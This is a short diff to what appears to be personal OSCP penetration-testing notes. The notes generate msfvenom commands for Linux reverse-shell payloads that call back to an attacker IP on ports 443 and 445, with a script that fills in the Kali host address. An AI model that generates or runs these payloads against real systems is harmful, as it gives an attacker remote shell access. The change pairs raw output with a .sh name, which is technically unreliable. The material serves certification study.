@@ -8,11 +8,11 @@ msfvenom -l payloads
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
 ```
 
-Linux TCP Reverse shell EXE | PORT 445 | shell.exe
+Linux TCP Reverse shell SH | PORT 445 | shell.sh
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=445 -f exe > shell.exe`;
+const command = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=445 -f raw > shell.sh`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
